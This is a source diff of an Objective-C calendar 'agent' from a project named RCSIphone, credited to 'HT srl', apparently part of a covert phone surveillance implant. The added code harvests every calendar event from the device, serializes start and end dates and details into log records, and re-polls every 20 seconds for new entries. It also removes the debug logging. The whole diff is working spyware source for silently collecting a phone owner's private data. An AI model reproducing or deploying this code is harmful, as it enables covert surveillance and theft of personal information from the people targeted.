@@ -3,7 +3,7 @@
 //  RCSIphone
 //
 //  Created by kiodo on 04/08/11.
-//  Copyright 2011 __MyCompanyName__. All rights reserved.
+//  Copyright 2011 HT srl. All rights reserved.
 //
 
 #import "RCSIAgentCalendar.h"
@@ -13,12 +13,32 @@
 
 //#define DEBUG_CAL
 
-static RCSIAgentCalendar *sharedAgentCalendar = nil;
 NSDate *gStartDate, *gEndDate;
+
+NSString *kRCSIAgentCalendarRunLoopMode = @"kRCSIAgentCalendarRunLoopMode";
 
 @implementation RCSIAgentCalendar
 
-@synthesize mAgentConfiguration;
+#pragma mark -
+#pragma mark Class and init methods
+#pragma mark -
+
+- (id)initWithConfigData:(NSData*)aData
+{
+  self = [super initWithConfigData: aData];
+  
+  if (self != nil)
+    {
+      mLastEvent = 0;
+      mAgentID   = AGENT_ORGANIZER;
+    }
+  
+  return self;
+}
+
+#pragma mark -
+#pragma mark support methods
+#pragma mark -
 
 - (BOOL)_setAgentMessagesProperty
 {
@@ -50,9 +70,6 @@ NSDate *gStartDate, *gEndDate;
 
   if (agentDict == nil) 
     {
-#ifdef DEBUG_CAL
-      NSLog(@"%s: getting prop failed!", __FUNCTION__);
-#endif
       return YES;
     }
 
@@ -61,30 +78,11 @@ NSDate *gStartDate, *gEndDate;
 
   mLastEvent = [lastEventDate doubleValue];
 
-#ifdef DEBUG_CAL
-  NSLog(@"%s: mLastEvent value 0x%f", __FUNCTION__, mLastEvent);
-#endif
-
+  [agentDict release];
+  
   [outerPool release];
 
   return YES;
-}
-
-- (id)init
-{
-  Class myClass = [self class];
-
-  @synchronized(myClass)
-    {
-      if (sharedAgentCalendar != nil)
-        {
-          self = [super init];
-          if (self) 
-            mLastEvent = 0;
-        }
-    }
-
-  return sharedAgentCalendar;
 }
 
 - (NSDate*)initStartDate
@@ -213,10 +211,6 @@ NSDate *gStartDate, *gEndDate;
   calStruct._ftEndDateHi = filetime >> 32;
   calStruct._ftEndDateLo = filetime & 0xFFFFFFFF;
 
-#ifdef DEBUG_CAL
-  NSLog(@"%s startDate %@, endDate %@", __FUNCTION__, [anEvent startDate], [anEvent endDate]);
-#endif
-
   [calData appendBytes: (const void *) &header length: sizeof(header)];
   [calData appendBytes: (const void *) &calStruct length:sizeof(PoomCalendar)];
 
@@ -304,7 +298,6 @@ NSDate *gStartDate, *gEndDate;
   tmpHeader = (HeaderStruct *) [calData bytes];  
   tmpHeader->dwSize = outLength;
 
-  // No additional param header required
   RCSILogManager *logManager = [RCSILogManager sharedInstance];
 
   BOOL success = [logManager createLog: LOG_CALENDAR
@@ -315,19 +308,12 @@ NSDate *gStartDate, *gEndDate;
                                            forAgent: LOG_CALENDAR
                                           withLogID: 0] == TRUE)
     {
-#ifdef DEBUG_CAL
-      NSLog(@"%s: writeDataToLog success", __FUNCTION__);
-#endif
-
       [logManager closeActiveLog: LOG_CALENDAR withLogID: 0];
 
       if ([[anEvent lastModifiedDate] timeIntervalSince1970] > mLastEvent)
         {
           mLastEvent = [[anEvent lastModifiedDate] timeIntervalSince1970];
           [self _setAgentMessagesProperty];
-#ifdef DEBUG_CAL
-          NSLog(@"%s: mLastEvent value 0x%f", __FUNCTION__, mLastEvent);
-#endif
         }
     }
 
@@ -350,186 +336,131 @@ NSDate *gStartDate, *gEndDate;
   return events;
 }
 
-- (void)parseCalEvents: (BOOL)allEvents withStartDate:(NSDate*)startDate andEndDate:(NSDate*)endDate
+- (void)runParseCalEvents: (BOOL)allEvents withStartDate:(NSDate*)startDate andEndDate:(NSDate*)endDate
 {
-  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-
-  UIDevice *device;
-
-  device = [UIDevice currentDevice];
-
+  UIDevice *device = [UIDevice currentDevice];
+  
   NSString *majVer = [[device systemVersion] substringToIndex:1];
-
-  if ([majVer compare: @"3"] == NSOrderedSame) 
+  
+  if ([majVer compare: @"3"] == NSOrderedSame || [self isThreadCancelled] == TRUE) 
     {
-      [pool release];
       return;
     }
-
+  
   NSArray *events = [self getEvents: startDate toDate: endDate];
-
+  
+  if ([self isThreadCancelled] == TRUE)
+    return;
+  
   if (events) 
     {
       for (int i=0; i < [events count]; i++) 
         {
+          if ([self isThreadCancelled] == TRUE)
+            break;
+        
           EKEvent *currEvent = (EKEvent*)[events objectAtIndex: i];
-
+          
           NSTimeInterval currDate = [[currEvent lastModifiedDate] timeIntervalSince1970];
-
+          
           if (currDate > mLastEvent || allEvents) 
             {
               [self writeCalLog: currEvent];
             }
         } 
     }
+}
+
+- (void)parseCalEvents:(NSTimer*)theTimer
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  NSDictionary *eventDict = (NSDictionary*)[theTimer userInfo];
+    
+  BOOL allEvents    = [[eventDict objectForKey:@"allevents"] boolValue];
+  NSDate *startDate = [eventDict objectForKey: @"startDate"];
+  NSDate *endDate   = [eventDict objectForKey: @"endDate"];
+  
+  [self runParseCalEvents: allEvents withStartDate: startDate andEndDate: endDate];
 
   [pool release];
 }
 
-- (void)start
+- (void)setCalPollingTimeOut:(NSTimeInterval)aTimeOut 
+              withDictionary:(NSDictionary*)theDict
+{  
+  NSTimer *timer = [NSTimer scheduledTimerWithTimeInterval: aTimeOut 
+                                                    target: self 
+                                                  selector: @selector(parseCalEvents:) 
+                                                  userInfo: theDict 
+                                                   repeats: YES];
+  
+  [[NSRunLoop currentRunLoop] addTimer: timer forMode: kRCSIAgentCalendarRunLoopMode];
+}
+
+- (void)startAgent
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
-  NSDate *startDate, *endDate;
-
-  //[self calcStartAndEndDate];
-  startDate = [self initStartDate];
-  endDate   = [self initEndDate];
-  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
-
+  if ([self isThreadCancelled] == TRUE)
+    {
+      [self setMAgentStatus: AGENT_STATUS_STOPPED];
+      [outerPool release];
+      return;
+    }
+  
+  NSDate *startDate = [self initStartDate];
+  NSDate *endDate   = [self initEndDate];
+  
   [self _getAgentMessagesProperty];
 
   if (mLastEvent == 0) 
     {
       mLastEvent = [[NSDate dateWithTimeIntervalSince1970:0] timeIntervalSince1970];
-      [self parseCalEvents: YES withStartDate:startDate andEndDate:endDate];
+      [self runParseCalEvents: YES withStartDate:startDate andEndDate:endDate];
     }
-
-  while([mAgentConfiguration objectForKey: @"status"] != AGENT_STOP &&
-        [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
+  
+  NSNumber *noNum   = [NSNumber numberWithBool: NO];
+  
+  NSDictionary *allEventDict = 
+      [[NSDictionary alloc] initWithObjectsAndKeys:noNum, 
+                                                   @"allevents",
+                                                   startDate, 
+                                                   @"startDate",
+                                                   endDate, 
+                                                   @"endDate", 
+                                                   nil];
+  
+  [self setCalPollingTimeOut: 20.0 withDictionary: allEventDict];
+  
+  while([self mAgentStatus] == AGENT_STATUS_RUNNING)
     {
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
 
-      [self parseCalEvents: NO withStartDate:startDate andEndDate:endDate];
-
-      for (int i=0; i<20; i++) 
-        {
-          sleep(1);
-          if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
-            break;
-        }
+      [[NSRunLoop currentRunLoop] runMode: kRCSIAgentCalendarRunLoopMode 
+                               beforeDate: [NSDate dateWithTimeIntervalSinceNow: 1.0]];
 
       [innerPool release];
     }
 
-  [mAgentConfiguration setObject: AGENT_STOPPED
-                          forKey: @"status"];
-
   [startDate release];
   [endDate release];
-
-  [mAgentConfiguration release];
-  mAgentConfiguration = nil;
+  [allEventDict release];
+  
+  [self setMAgentStatus: AGENT_STATUS_STOPPED];
   
   [outerPool release];
 }
 
-- (BOOL)stop
+- (BOOL)stopAgent
 {
-  int internalCounter = 0;
-
-  // Already set by Agent AddressBook: not mandatory...
-  [mAgentConfiguration setObject: AGENT_STOP
-                          forKey: @"status"];
-
-  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED
-         && internalCounter <= 5)
-    {
-      internalCounter++;
-      sleep(1);
-    }
-
- return YES;
+  [self setMAgentStatus: AGENT_STATUS_STOPPING];
+  return YES;
 }
 
 - (BOOL)resume
 {
   return YES;
 }
-
-#pragma mark -
-#pragma mark Getter/Setter
-#pragma mark -
-
-+ (RCSIAgentCalendar *)sharedInstance
-{
-  @synchronized(self)
-    {
-      if (sharedAgentCalendar == nil)
-        {
-          //
-          // Assignment is not done here
-          //
-          [[self alloc] init];
-        }
-    }
-
-  return sharedAgentCalendar;
-}
-
-+ (id)allocWithZone: (NSZone *)aZone
-{
-  @synchronized(self)
-    {
-      if (sharedAgentCalendar == nil)
-        {
-          sharedAgentCalendar = [super allocWithZone: aZone];
-
-          //
-          // Assignment and return on first allocation
-          //
-          return sharedAgentCalendar;
-        }
-    }
-
-  // On subsequent allocation attemps return nil
-  return nil;
-}
-
-- (id)copyWithZone: (NSZone *)aZone
-{
-  return self;
-}
-
-//    EKRecurrenceRule *recRule = [currEvent recurrenceRule];
-//    
-//    if (recRule) 
-//    {
-//      switch([recRule frequency])
-//      {
-//        case EKRecurrenceFrequencyDaily:
-//#ifdef DEBUG_CAL 
-//          NSLog(@"%s: frequency daily", __FUNCTION__);
-//#endif
-//        break;
-//        case EKRecurrenceFrequencyWeekly:
-//#ifdef DEBUG_CAL 
-//          NSLog(@"%s: frequency weekly", __FUNCTION__);
-//#endif
-//        break;
-//        case EKRecurrenceFrequencyMonthly:
-//#ifdef DEBUG_CAL
-//          NSLog(@"%s: frequency Monthly", __FUNCTION__);
-//#endif
-//        break;
-//        case EKRecurrenceFrequencyYearly:
-//#ifdef DEBUG_CAL 
-//          NSLog(@"%s: frequency Yearly", __FUNCTION__);
-//#endif
-//        break;
-//      }
-//      
-//      NSLog(@"%s: interval %d", __FUNCTION__, [recRule interval]);      
-//    }
 
 @end
